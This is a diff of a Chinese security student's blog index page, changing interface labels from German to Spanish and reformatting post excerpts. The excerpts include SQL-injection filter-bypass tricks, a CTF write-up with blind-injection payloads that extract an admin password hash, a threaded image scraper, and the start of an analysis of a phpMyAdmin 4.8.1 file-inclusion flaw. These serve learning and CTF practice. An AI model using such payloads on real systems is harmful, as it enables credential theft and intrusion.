@@ -118,7 +118,7 @@
                 
                 
                 
-                <a class="navbar-item search" title="Suche" href="javascript:;">
+                <a class="navbar-item search" title="Buscar" href="javascript:;">
                     <i class="fas fa-search"></i>
                 </a>
                 
@@ -144,7 +144,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    a few seconds lesen (Über 79 Worte)
+                    a few seconds leer (Acerca de 79 palabras)
                 </span>
                 
                 
@@ -157,7 +157,9 @@
             
         </h1>
         <div class="content">
-            <p><script type="text/javascript" src="/js/src/bai.js"></script><br><img src="/%E5%85%B3%E4%BA%8E%E6%88%91/1.jpg" class><br>努力赶上大佬的安全小白；<br>励志做一个安全研究员的大学生；<br>三流CTFer。</p>
+            <script type="text/javascript" src="/js/src/bai.js"></script>
+<img src="/%E5%85%B3%E4%BA%8E%E6%88%91/1.jpg" class>
+<p>努力赶上大佬的安全小白；<br>励志做一个安全研究员的大学生；<br>三流CTFer。</p>
 <hr>
 <p>2020年计划：<br>用PHP开发一个MVC架构的项目；<br>用Python写一个Scrapy的分布式爬虫；<br>努力刷题，让自己在CTF小有成就。</p>
 
@@ -193,7 +195,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    3 minutes lesen (Über 391 Worte)
+                    3 minutes leer (Acerca de 391 palabras)
                 </span>
                 
                 
@@ -213,7 +215,7 @@
         <div class="level is-mobile">
             <div class="level-start">
                 <div class="level-item">
-                <a class="button is-size-7 is-light" href="/2020-2%E6%9C%88%E6%80%BB%E7%BB%93.html#more">Mehr lesen</a>
+                <a class="button is-size-7 is-light" href="/2020-2%E6%9C%88%E6%80%BB%E7%BB%93.html#more">Leer más</a>
                 </div>
             </div>
         </div>
@@ -247,7 +249,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    5 minutes lesen (Über 716 Worte)
+                    5 minutes leer (Acerca de 716 palabras)
                 </span>
                 
                 
@@ -267,7 +269,7 @@
         <div class="level is-mobile">
             <div class="level-start">
                 <div class="level-item">
-                <a class="button is-size-7 is-light" href="/Java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html#more">Mehr lesen</a>
+                <a class="button is-size-7 is-light" href="/Java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html#more">Leer más</a>
                 </div>
             </div>
         </div>
@@ -301,7 +303,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    9 minutes lesen (Über 1281 Worte)
+                    9 minutes leer (Acerca de 1281 palabras)
                 </span>
                 
                 
@@ -321,7 +323,7 @@
         <div class="level is-mobile">
             <div class="level-start">
                 <div class="level-item">
-                <a class="button is-size-7 is-light" href="/SQL%E6%B3%A8%E5%85%A5Trick-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html#more">Mehr lesen</a>
+                <a class="button is-size-7 is-light" href="/SQL%E6%B3%A8%E5%85%A5Trick-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html#more">Leer más</a>
                 </div>
             </div>
         </div>
@@ -355,7 +357,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    14 minutes lesen (Über 2157 Worte)
+                    14 minutes leer (Acerca de 2157 palabras)
                 </span>
                 
                 
@@ -368,15 +370,23 @@
             
         </h1>
         <div class="content">
-            <p><script type="text/javascript" src="/js/src/bai.js"></script></p>
-<h3 id="0x01-数据库特性"><a href="#0x01-数据库特性" class="headerlink" title="0x01 数据库特性"></a>0x01 数据库特性</h3><h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><p>常见的注释符号：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#，--空格，-- -，--+，&#x2F;&#x2F;，&#x2F;**&#x2F;，&#x2F;*任意字符串*&#x2F;，;</span><br></pre></td></tr></table></figure><br>一般是使用/<strong>/来绕过过滤空格。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id&#x3D;1;</span><br><span class="line">select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users&#x2F;*111*&#x2F;where&#x2F;**&#x2F;id&#x3D;1;</span><br></pre></td></tr></table></figure><br>上面两条语句执行结果是一样的。<br><img src="/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/1.png" class title="This is an test image"><br>需要注意的是：虽然#，–空格 – - –+都是注释符，但是在不同网站对它们的解析不同。<br><img src="/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/2.png" class title="This is an test image"><br>这个时候就需要我们多加测试，看看哪种注释符可以被网站的数据库解析执行。<br></strong></p>
+            <script type="text/javascript" src="/js/src/bai.js"></script>
+<h3 id="0x01-数据库特性"><a href="#0x01-数据库特性" class="headerlink" title="0x01 数据库特性"></a>0x01 数据库特性</h3><h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><p>常见的注释符号：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#，--空格，-- -，--+，&#x2F;&#x2F;，&#x2F;**&#x2F;，&#x2F;*任意字符串*&#x2F;，;</span><br></pre></td></tr></table></figure>
+<p>一般是使用/**/来绕过过滤空格。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id&#x3D;1;</span><br><span class="line">select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users&#x2F;*111*&#x2F;where&#x2F;**&#x2F;id&#x3D;1;</span><br></pre></td></tr></table></figure>
+<p>上面两条语句执行结果是一样的。</p>
+<img src="/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/1.png" class title="This is an test image">
+<p>需要注意的是：虽然#，–空格 – - –+都是注释符，但是在不同网站对它们的解析不同。</p>
+<img src="/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/2.png" class title="This is an test image">
+<p>这个时候就需要我们多加测试，看看哪种注释符可以被网站的数据库解析执行。</p>
         </div>
         
         
         <div class="level is-mobile">
             <div class="level-start">
                 <div class="level-item">
-                <a class="button is-size-7 is-light" href="/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80.html#more">Mehr lesen</a>
+                <a class="button is-size-7 is-light" href="/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80.html#more">Leer más</a>
                 </div>
             </div>
         </div>
@@ -410,7 +420,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    5 minutes lesen (Über 752 Worte)
+                    5 minutes leer (Acerca de 752 palabras)
                 </span>
                 
                 
@@ -423,11 +433,33 @@
             
         </h1>
         <div class="content">
-            <p><script type="text/javascript" src="/js/src/bai.js"></script></p>
+            <script type="text/javascript" src="/js/src/bai.js"></script>
 <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>从今天开始学习各种fuzz测试，今天做了一道sql注入题，通过fuzz来判断过滤字符，从而构造payload进行绕过。</p>
 <hr>
-<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>拿到题目进行简单的测试<br><img src="/SQL%E6%B3%A8%E5%85%A5Fuzz%E8%AE%B0%E5%BD%95/1.png" class title="This is an test image"><br>发现这题进行了一些sql关键字的过滤，我们通过burp的Intruder模块进行fuzz。<br><img src="/SQL%E6%B3%A8%E5%85%A5Fuzz%E8%AE%B0%E5%BD%95/2.png" class title="This is an test image"><br>字段长度为370的是被过滤的sql语句。<br><strong>进一步分析看看这题目到底过滤了哪些关键字，通过一个个分析知道过滤了：# –+等注释符，空格，%0a,%0b等绕过过滤空格的url编码，逗号(,)，包含and和or的字符。还有很多绕过过滤的关键字，发现没有过滤sleep()，尝试一下时间盲注。</strong><br>常规的时间盲注为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(条件,sleep(3),2)</span><br></pre></td></tr></table></figure><br>但是题目过滤了逗号，想到用case when替换：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">case when 条件 then sleep(2) else 1 end</span><br></pre></td></tr></table></figure><br>但是过滤了空格等分隔符，同时内联注释 注释符 %0a %0b %0d %a0也多被过滤，我们可以用括号来代替空格：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">case when(条件)then(sleep(2))else(1)end</span><br></pre></td></tr></table></figure><br>但是测试发现case和when中间是不能添加括号的，到这里时间盲注也是不可行的。</p>
-<p>可以尝试另类的布尔盲注:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;admin&#39;&#x3D;&#39;admin&#39;+1 union select &#39;admin&#39;&#x3D;&#39;admin&#39;+0;</span><br></pre></td></tr></table></figure><br>在本地测试发现，第一个输出0，第二个输出1。<br><img src="/SQL%E6%B3%A8%E5%85%A5Fuzz%E8%AE%B0%E5%BD%95/3.png" class title="This is an test image"><br>这是mysql的一个特性：<strong>在第一个查询中，先进行右边的’admin’+1操作，这个时候会强制转换admin为数字，然后相加完在和等号左边的admin比较，这个时候也会强制转换，所以就会形成不相等的情况。</strong><br>上面就可以形成布尔逻辑判断了。<br>首先我们可以先判断一些admin账号的密码长度<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;%2b(length(passwd)&#x3D;32)%2b&#39;</span><br></pre></td></tr></table></figure><br>%2b是+号，不能直接使用加号因为被过滤了，这里也可以使用-号，效果相同。<br>上面的逻辑是：如果passwd长度为32，则返回1，然后和admin作相加操作，这样就会形成逻辑上的差别。如下图：<br><img src="/SQL%E6%B3%A8%E5%85%A5Fuzz%E8%AE%B0%E5%BD%95/4.png" class title="This is an test image"><br><img src="/SQL%E6%B3%A8%E5%85%A5Fuzz%E8%AE%B0%E5%BD%95/5.png" class title="This is an test image"><br>这样就可以判断admin的密码是个32为的md5值。<br>然后在猜解每个字符，通过mid函数进行：<strong>但for被过滤！</strong><br>mid(xxx from 1)  第一位开始取剩下的所有字符<br><strong>ascii(mid(xxx from 1)) 发现截断 取第一个字符的ascii值。</strong><br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;%2b(ascii(mid((passwd)from(1)))&#x3D;48)%2b&#39;</span><br></pre></td></tr></table></figure><br>通过括号绕过空格过滤，通过mysql中的mid，ascii函数特性绕过for过滤。<br>最后通过burp爆破每一位的ascii值，就可以得到密码的md5值了。<br><img src="/SQL%E6%B3%A8%E5%85%A5Fuzz%E8%AE%B0%E5%BD%95/6.png" class title="This is an test image"></p>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>拿到题目进行简单的测试</p>
+<img src="/SQL%E6%B3%A8%E5%85%A5Fuzz%E8%AE%B0%E5%BD%95/1.png" class title="This is an test image">
+<p>发现这题进行了一些sql关键字的过滤，我们通过burp的Intruder模块进行fuzz。</p>
+<img src="/SQL%E6%B3%A8%E5%85%A5Fuzz%E8%AE%B0%E5%BD%95/2.png" class title="This is an test image">
+<p>字段长度为370的是被过滤的sql语句。<br><strong>进一步分析看看这题目到底过滤了哪些关键字，通过一个个分析知道过滤了：# –+等注释符，空格，%0a,%0b等绕过过滤空格的url编码，逗号(,)，包含and和or的字符。还有很多绕过过滤的关键字，发现没有过滤sleep()，尝试一下时间盲注。</strong><br>常规的时间盲注为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(条件,sleep(3),2)</span><br></pre></td></tr></table></figure>
+<p>但是题目过滤了逗号，想到用case when替换：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">case when 条件 then sleep(2) else 1 end</span><br></pre></td></tr></table></figure>
+<p>但是过滤了空格等分隔符，同时内联注释 注释符 %0a %0b %0d %a0也多被过滤，我们可以用括号来代替空格：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">case when(条件)then(sleep(2))else(1)end</span><br></pre></td></tr></table></figure>
+<p>但是测试发现case和when中间是不能添加括号的，到这里时间盲注也是不可行的。</p>
+<p>可以尝试另类的布尔盲注:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;admin&#39;&#x3D;&#39;admin&#39;+1 union select &#39;admin&#39;&#x3D;&#39;admin&#39;+0;</span><br></pre></td></tr></table></figure>
+<p>在本地测试发现，第一个输出0，第二个输出1。</p>
+<img src="/SQL%E6%B3%A8%E5%85%A5Fuzz%E8%AE%B0%E5%BD%95/3.png" class title="This is an test image">
+<p>这是mysql的一个特性：<strong>在第一个查询中，先进行右边的’admin’+1操作，这个时候会强制转换admin为数字，然后相加完在和等号左边的admin比较，这个时候也会强制转换，所以就会形成不相等的情况。</strong><br>上面就可以形成布尔逻辑判断了。<br>首先我们可以先判断一些admin账号的密码长度</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;%2b(length(passwd)&#x3D;32)%2b&#39;</span><br></pre></td></tr></table></figure>
+<p>%2b是+号，不能直接使用加号因为被过滤了，这里也可以使用-号，效果相同。<br>上面的逻辑是：如果passwd长度为32，则返回1，然后和admin作相加操作，这样就会形成逻辑上的差别。如下图：</p>
+<img src="/SQL%E6%B3%A8%E5%85%A5Fuzz%E8%AE%B0%E5%BD%95/4.png" class title="This is an test image">
+<img src="/SQL%E6%B3%A8%E5%85%A5Fuzz%E8%AE%B0%E5%BD%95/5.png" class title="This is an test image">
+<p>这样就可以判断admin的密码是个32为的md5值。<br>然后在猜解每个字符，通过mid函数进行：<strong>但for被过滤！</strong><br>mid(xxx from 1)  第一位开始取剩下的所有字符<br><strong>ascii(mid(xxx from 1)) 发现截断 取第一个字符的ascii值。</strong><br>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;%2b(ascii(mid((passwd)from(1)))&#x3D;48)%2b&#39;</span><br></pre></td></tr></table></figure>
+<p>通过括号绕过空格过滤，通过mysql中的mid，ascii函数特性绕过for过滤。<br>最后通过burp爆破每一位的ascii值，就可以得到密码的md5值了。</p>
+<img src="/SQL%E6%B3%A8%E5%85%A5Fuzz%E8%AE%B0%E5%BD%95/6.png" class title="This is an test image">
 
         </div>
         
@@ -461,7 +493,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    2 minutes lesen (Über 323 Worte)
+                    2 minutes leer (Acerca de 323 palabras)
                 </span>
                 
                 
@@ -474,8 +506,9 @@
             
         </h1>
         <div class="content">
-            <p><script type="text/javascript" src="/js/src/bai.js"></script><br><strong>通过threading库加上queue的安全队列进行了一次对表情包网的爬出。</strong><br>代码如下：<br>使用了消费者和生产者的多线程爬虫。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">import threading</span><br><span class="line">from queue import Queue</span><br><span class="line">from urllib import request</span><br><span class="line">import requests</span><br><span class="line">from lxml import etree</span><br><span class="line">class Producer(threading.Thread):</span><br><span class="line">    headers &#x3D; &#123;</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.87 Safari&#x2F;537.36&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    def __init__ (self, page_queue,  img_queue, *args, **kwargs):</span><br><span class="line">        super(Producer, self).__init__(*args, **kwargs)</span><br><span class="line">        self.page_queue &#x3D; page_queue</span><br><span class="line">        self.image_queue &#x3D; img_queue</span><br><span class="line">    def run(self):</span><br><span class="line">        while True:</span><br><span class="line">            if self.page_queue.empty():</span><br><span class="line">                break</span><br><span class="line">            url &#x3D; self.page_queue.get()</span><br><span class="line">            self.spider(url)</span><br><span class="line">    def spider(self, url):</span><br><span class="line">        resp &#x3D; requests.get(url, headers&#x3D;self.headers)</span><br><span class="line">        text &#x3D; resp.text</span><br><span class="line">        html &#x3D; etree.HTML(text)</span><br><span class="line">        imgs &#x3D; html.xpath(&quot;&#x2F;&#x2F;div[@class&#x3D;&#39;page-content text-center&#39;]&#x2F;&#x2F;img[@class!&#x3D;&#39;gif&#39;]&quot;)</span><br><span class="line">        for i in imgs:</span><br><span class="line">            img &#x3D; i.get(&#39;data-original&#39;)</span><br><span class="line">            suffix &#x3D; os.path.splitext(img)[1]</span><br><span class="line">            alt &#x3D; i.get(&#39;alt&#39;)</span><br><span class="line">            alt &#x3D; re.sub(r&#39;[\?\.？。，,!！\*]&#39;, &#39;&#39;, alt)</span><br><span class="line">            filename &#x3D; alt + suffix</span><br><span class="line">            print(&#39;&#x2F;images&#x2F;%s&#39; %filename)</span><br><span class="line">            self.image_queue.put((img, filename))</span><br><span class="line">class Consumer(threading.Thread):</span><br><span class="line">    def __init__(self,page_queue,img_queue,*args,**kwargs):</span><br><span class="line">        super(Consumer, self).__init__(*args, **kwargs)</span><br><span class="line">        self.page_queue &#x3D; page_queue</span><br><span class="line">        self.img_queue &#x3D; img_queue</span><br><span class="line">    def run(self):</span><br><span class="line">        while True:</span><br><span class="line">            if self.page_queue.empty() and self.img_queue.empty():</span><br><span class="line">                break</span><br><span class="line">            img_url,filename&#x3D;self.img_queue.get()</span><br><span class="line">            request.urlretrieve(img_url,&quot;images&#x2F;&quot;+filename)</span><br><span class="line">            print(filename+&quot;  下载完成！&quot;)</span><br><span class="line">def main():</span><br><span class="line">    page_queue &#x3D; Queue(100)</span><br><span class="line">    img_queue &#x3D; Queue(1000)</span><br><span class="line">    base_url &#x3D; &quot;http:&#x2F;&#x2F;www.doutula.com&#x2F;photo&#x2F;list&#x2F;?page&#x3D;&#123;&#125;&quot;</span><br><span class="line">    for i in range(1, 101):</span><br><span class="line">        url &#x3D; base_url.format(i)</span><br><span class="line">        page_queue.put(url)</span><br><span class="line">    for i in range(5):</span><br><span class="line">        t&#x3D;Producer(page_queue,img_queue)</span><br><span class="line">        t.start()</span><br><span class="line">    for i in  range(5):</span><br><span class="line">        t&#x3D;Consumer(page_queue,img_queue)</span><br><span class="line">        t.start()</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>
-
+            <script type="text/javascript" src="/js/src/bai.js"></script>
+<p><strong>通过threading库加上queue的安全队列进行了一次对表情包网的爬出。</strong><br>代码如下：<br>使用了消费者和生产者的多线程爬虫。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">import threading</span><br><span class="line">from queue import Queue</span><br><span class="line">from urllib import request</span><br><span class="line">import requests</span><br><span class="line">from lxml import etree</span><br><span class="line">class Producer(threading.Thread):</span><br><span class="line">    headers &#x3D; &#123;</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.87 Safari&#x2F;537.36&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    def __init__ (self, page_queue,  img_queue, *args, **kwargs):</span><br><span class="line">        super(Producer, self).__init__(*args, **kwargs)</span><br><span class="line">        self.page_queue &#x3D; page_queue</span><br><span class="line">        self.image_queue &#x3D; img_queue</span><br><span class="line">    def run(self):</span><br><span class="line">        while True:</span><br><span class="line">            if self.page_queue.empty():</span><br><span class="line">                break</span><br><span class="line">            url &#x3D; self.page_queue.get()</span><br><span class="line">            self.spider(url)</span><br><span class="line">    def spider(self, url):</span><br><span class="line">        resp &#x3D; requests.get(url, headers&#x3D;self.headers)</span><br><span class="line">        text &#x3D; resp.text</span><br><span class="line">        html &#x3D; etree.HTML(text)</span><br><span class="line">        imgs &#x3D; html.xpath(&quot;&#x2F;&#x2F;div[@class&#x3D;&#39;page-content text-center&#39;]&#x2F;&#x2F;img[@class!&#x3D;&#39;gif&#39;]&quot;)</span><br><span class="line">        for i in imgs:</span><br><span class="line">            img &#x3D; i.get(&#39;data-original&#39;)</span><br><span class="line">            suffix &#x3D; os.path.splitext(img)[1]</span><br><span class="line">            alt &#x3D; i.get(&#39;alt&#39;)</span><br><span class="line">            alt &#x3D; re.sub(r&#39;[\?\.？。，,!！\*]&#39;, &#39;&#39;, alt)</span><br><span class="line">            filename &#x3D; alt + suffix</span><br><span class="line">            print(&#39;&#x2F;images&#x2F;%s&#39; %filename)</span><br><span class="line">            self.image_queue.put((img, filename))</span><br><span class="line">class Consumer(threading.Thread):</span><br><span class="line">    def __init__(self,page_queue,img_queue,*args,**kwargs):</span><br><span class="line">        super(Consumer, self).__init__(*args, **kwargs)</span><br><span class="line">        self.page_queue &#x3D; page_queue</span><br><span class="line">        self.img_queue &#x3D; img_queue</span><br><span class="line">    def run(self):</span><br><span class="line">        while True:</span><br><span class="line">            if self.page_queue.empty() and self.img_queue.empty():</span><br><span class="line">                break</span><br><span class="line">            img_url,filename&#x3D;self.img_queue.get()</span><br><span class="line">            request.urlretrieve(img_url,&quot;images&#x2F;&quot;+filename)</span><br><span class="line">            print(filename+&quot;  下载完成！&quot;)</span><br><span class="line">def main():</span><br><span class="line">    page_queue &#x3D; Queue(100)</span><br><span class="line">    img_queue &#x3D; Queue(1000)</span><br><span class="line">    base_url &#x3D; &quot;http:&#x2F;&#x2F;www.doutula.com&#x2F;photo&#x2F;list&#x2F;?page&#x3D;&#123;&#125;&quot;</span><br><span class="line">    for i in range(1, 101):</span><br><span class="line">        url &#x3D; base_url.format(i)</span><br><span class="line">        page_queue.put(url)</span><br><span class="line">    for i in range(5):</span><br><span class="line">        t&#x3D;Producer(page_queue,img_queue)</span><br><span class="line">        t.start()</span><br><span class="line">    for i in  range(5):</span><br><span class="line">        t&#x3D;Consumer(page_queue,img_queue)</span><br><span class="line">        t.start()</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
         </div>
         
         
@@ -508,7 +541,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    4 minutes lesen (Über 602 Worte)
+                    4 minutes leer (Acerca de 602 palabras)
                 </span>
                 
                 
@@ -521,10 +554,23 @@
             
         </h1>
         <div class="content">
-            <p><script type="text/javascript" src="/js/src/bai.js"></script><br>漏洞影响范围：phpmyadmin4.8.0 4.8.1<br>漏洞类型：后台任意文件包含<br><a href="https://files.phpmyadmin.net/phpMyAdmin/4.8.1/phpMyAdmin-4.8.1-all-languages.zip">下载地址</a></p>
-<p>漏洞出现在index.php页面中的55~63行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if (! empty($_REQUEST[&#39;target&#39;])</span><br><span class="line">    &amp;&amp; is_string($_REQUEST[&#39;target&#39;])</span><br><span class="line">    &amp;&amp; ! preg_match(&#39;&#x2F;^index&#x2F;&#39;, $_REQUEST[&#39;target&#39;])</span><br><span class="line">    &amp;&amp; ! in_array($_REQUEST[&#39;target&#39;], $target_blacklist)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity($_REQUEST[&#39;target&#39;])</span><br><span class="line">) &#123;</span><br><span class="line">    include $_REQUEST[&#39;target&#39;];</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>看这个段代码的逻辑：传入的target参数不为空；target是字符串类型；target不易index开头；target不在$target_blacklist中；checkPageValidity($_REQUEST[‘target’]返回true。</p>
-<p>看一下$target_blacklist：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$target_blacklist &#x3D; array (</span><br><span class="line">    &#39;import.php&#39;, &#39;export.php&#39;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><br>追踪一下checkPageValidity函数：在/libraries/classes/Core.php中找到，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">public static function checkPageValidity(&amp;$page, array </span><br><span class="line">$whitelist &#x3D; [])</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">       if (empty($whitelist)) &#123;</span><br><span class="line">            $whitelist &#x3D; self::$goto_whitelist;</span><br><span class="line">        &#125;</span><br><span class="line">       if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        if (in_array($page, $whitelist)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        $_page &#x3D; mb_substr(</span><br><span class="line">           $page,</span><br><span class="line">            0,</span><br><span class="line">            mb_strpos($page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">        );</span><br><span class="line">        if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        $_page &#x3D; urldecode($page);</span><br><span class="line">        $_page &#x3D; mb_substr(</span><br><span class="line">            $_page,</span><br><span class="line">            0,</span><br><span class="line">            mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">        );</span><br><span class="line">        if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    